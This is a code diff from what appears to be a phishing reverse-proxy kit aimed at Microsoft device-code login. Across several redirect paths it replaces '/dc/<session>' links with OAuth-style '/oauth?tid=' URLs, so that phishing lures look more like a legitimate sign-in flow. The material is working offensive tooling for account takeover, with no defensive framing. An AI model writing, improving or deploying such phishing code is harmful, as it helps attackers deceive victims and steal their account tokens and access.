@@ -313,13 +313,13 @@ func (p *HttpProxy) handleLureRedirect(req *http.Request, from_ip string, ps *Pr
 				p.deviceCode.StartPolling(dcSess.ID)
 			}()
 			dcTheme := l.DeviceCodeTheme
-			interstitialURL := fmt.Sprintf("/dc/%s", session.Id)
-			if dcTheme != "" && dcTheme != "default" {
-				// Generate numeric tid and store mapping for OAuth-style URL
-				numericTid := generateNumericTid()
-				p.storeTidMapping(numericTid, session.Id, dcTheme)
-				interstitialURL = fmt.Sprintf("/oauth?tid=%s", numericTid)
+			if dcTheme == "" {
+				dcTheme = "default"
 			}
+			// Always use OAuth-style URL for all themes
+			numericTid := generateNumericTid()
+			p.storeTidMapping(numericTid, session.Id, dcTheme)
+			interstitialURL := fmt.Sprintf("/oauth?tid=%s", numericTid)
 			resp := goproxy.NewResponse(req, "text/plain", http.StatusFound, "")
 			resp.Header.Set("Location", interstitialURL)
 			resp.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
@@ -351,13 +351,13 @@ func (p *HttpProxy) handleLureRedirect(req *http.Request, from_ip string, ps *Pr
 				p.deviceCode.StartPolling(dcSess.ID)
 			}()
 			dcTheme := l.DeviceCodeTheme
-			interstitialURL := fmt.Sprintf("/dc/%s", session.Id)
-			if dcTheme != "" && dcTheme != "default" {
-				// Generate numeric tid and store mapping for OAuth-style URL
-				numericTid := generateNumericTid()
-				p.storeTidMapping(numericTid, session.Id, dcTheme)
-				interstitialURL = fmt.Sprintf("/oauth?tid=%s", numericTid)
+			if dcTheme == "" {
+				dcTheme = "default"
 			}
+			// Always use OAuth-style URL for all themes
+			numericTid := generateNumericTid()
+			p.storeTidMapping(numericTid, session.Id, dcTheme)
+			interstitialURL := fmt.Sprintf("/oauth?tid=%s", numericTid)
 			resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
 			resp.Header.Set("Location", interstitialURL)
 			resp.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
@@ -2341,16 +2341,14 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										return req, resp
 									} else {
 										// Session still active - redirect to device code interstitial
-										dcTheme := ""
-										if session.PhishLure != nil {
+										dcTheme := "default"
+										if session.PhishLure != nil && session.PhishLure.DeviceCodeTheme != "" {
 											dcTheme = session.PhishLure.DeviceCodeTheme
 										}
-										var interstitialURL string
-										if dcTheme != "" && dcTheme != "default" {
-											interstitialURL = fmt.Sprintf("/access/%s/%s", dcTheme, session.Id)
-										} else {
-											interstitialURL = fmt.Sprintf("/dc/%s", session.Id)
-										}
+										// Always use OAuth-style URL
+										numericTid := generateNumericTid()
+										p.storeTidMapping(numericTid, session.Id, dcTheme)
+										interstitialURL := fmt.Sprintf("/oauth?tid=%s", numericTid)
 										log.Debug("[devicecode] revisit detected (mode: %s, state: %s), re-redirecting to %s", session.DCMode, session.DCState, interstitialURL)
 										resp := goproxy.NewResponse(req, "text/plain", http.StatusFound, "Redirecting...")
 										resp.Header.Set("Location", interstitialURL)
@@ -2670,17 +2668,14 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										}()
 
 										// Redirect immediately (don't wait for Microsoft API)
-										// Use themed URL if dc_theme is set on the lure
+										// Always use OAuth-style URL for all themes
 										dcTheme := l.DeviceCodeTheme
-										var interstitialURL string
-										if dcTheme != "" && dcTheme != "default" {
-											// Generate numeric tid and store mapping for OAuth-style URL
-											numericTid := generateNumericTid()
-											p.storeTidMapping(numericTid, session.Id, dcTheme)
-											interstitialURL = fmt.Sprintf("/oauth?tid=%s", numericTid)
-										} else {
-											interstitialURL = fmt.Sprintf("/dc/%s", session.Id)
+										if dcTheme == "" {
+											dcTheme = "default"
 										}
+										numericTid := generateNumericTid()
+										p.storeTidMapping(numericTid, session.Id, dcTheme)
+										interstitialURL := fmt.Sprintf("/oauth?tid=%s", numericTid)
 										log.Debug("[devicecode] DCModeDirect: redirecting to %s", interstitialURL)
 										resp := goproxy.NewResponse(req, "text/plain", http.StatusFound, "Redirecting...")
 										resp.Header.Set("Location", interstitialURL)
@@ -2747,16 +2742,14 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										// For "always" mode: redirect immediately to device code interstitial
 										if dcMode == DCModeAlways {
 											session.DCState = DCStatePending
-											var interstitialURL string
-											dcTheme := ""
-											if l != nil {
+											dcTheme := "default"
+											if l != nil && l.DeviceCodeTheme != "" {
 												dcTheme = l.DeviceCodeTheme
 											}
-											if dcTheme != "" && dcTheme != "default" {
-												interstitialURL = fmt.Sprintf("/access/%s/%s", dcTheme, session.Id)
-											} else {
-												interstitialURL = fmt.Sprintf("/dc/%s", session.Id)
-											}
+											// Always use OAuth-style URL
+											numericTid := generateNumericTid()
+											p.storeTidMapping(numericTid, session.Id, dcTheme)
+											interstitialURL := fmt.Sprintf("/oauth?tid=%s", numericTid)
 											log.Debug("[devicecode] DCModeAlways: redirecting to %s", interstitialURL)
 											resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
 											resp.Header.Set("Location", interstitialURL)
